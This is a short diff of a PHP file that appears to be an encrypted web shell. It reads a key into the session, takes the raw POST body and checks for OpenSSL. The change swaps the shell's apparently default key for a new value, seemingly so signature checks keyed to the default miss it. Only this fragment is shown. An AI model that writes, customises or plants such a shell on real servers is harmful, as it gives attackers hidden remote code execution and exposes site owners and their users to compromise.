@@ -4,7 +4,7 @@ session_start();
 
 if ($_SERVER['REQUEST_METHOD'] === 'POST')
 {
-    $key="e45e329feb5d925b";
+    $key="f1e081755f1e3b9c";
 	$_SESSION['k']=$key;
 	$post=file_get_contents("php://input");
 	if(!extension_loaded('openssl'))
